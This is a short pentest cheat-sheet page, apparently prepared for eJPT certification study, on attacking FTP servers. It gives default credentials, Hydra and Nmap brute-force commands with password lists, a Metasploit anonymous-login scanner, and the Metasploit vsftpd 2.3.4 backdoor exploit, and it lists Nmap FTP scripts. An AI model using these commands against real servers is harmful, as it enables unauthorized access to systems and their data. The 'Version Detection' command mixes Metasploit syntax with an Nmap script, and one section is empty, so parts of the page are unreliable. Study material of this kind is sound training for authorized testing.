---
description: How to attack File Transfer Protocol port 21
---

# 🟢 FTP 21

Today I will share some basic commands used to attack the FTP service on eJPT Certification, if you want to learn more about Hacking FTP Server read section dedicated to it.

{% embed url="https://discord.gg/u6kEUZBmwG" %}

### What is the FTP Protocol?

### Default Credentials

```
guest:guest
anonymous:anonymous
```

### Version Detection

```
use exploit/unix/ftp/tftp-enum.nse
set RHOSTS 
set RPORT 21
```

### How to Brute force FTP Services

```
hydra -l admin -P Top_100_Passwords.txt ftp://localhost/
```

```
nmap --script ftp-brute -p 21 --script-args userdb=/root/Top_10_UserAdmins.txt,passdb=root/Top_100_Passwords.txt <IP>
```

```
msf6 > use auxiliary/scanner/ftp/anonymous
```

![](<../.gitbook/assets/image (1).png>)

```
set RHOSTS nerdherd.thm
set RPORT 21
run
```

![](<../.gitbook/assets/image (2).png>)

### How to Exploit vsftpd 2.3.4 Backdoor

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Nmap NSE Scripts for FTP

```
┌──(rfs㉿PopLabSec)-[~]
└─$ ls -la /usr/share/nmap/scripts | grep -e "ftp"
-rw-r--r-- 1 root root   4530 Jan 18 09:54 ftp-anon.nse
-rw-r--r-- 1 root root   3253 Jan 18 09:54 ftp-bounce.nse
-rw-r--r-- 1 root root   3108 Jan 18 09:54 ftp-brute.nse
-rw-r--r-- 1 root root   3272 Jan 18 09:54 ftp-libopie.nse
-rw-r--r-- 1 root root   3290 Jan 18 09:54 ftp-proftpd-backdoor.nse
-rw-r--r-- 1 root root   3768 Jan 18 09:54 ftp-syst.nse
-rw-r--r-- 1 root root   6021 Jan 18 09:54 ftp-vsftpd-backdoor.nse
-rw-r--r-- 1 root root   5923 Jan 18 09:54 ftp-vuln-cve2010-4221.nse
-rw-r--r-- 1 root root   5736 Jan 18 09:54 tftp-enum.nse
```

{% embed url="https://www.poplabsec.com/brute-force-ftp-login" %}

{% embed url="https://www.poplabsec.com/learn-how-to-attack-ftp-service-vsftpd-2-3-4" %}

{% embed url="https://www.youtube.com/watch?v=Xfh5a6fRsD4" %}
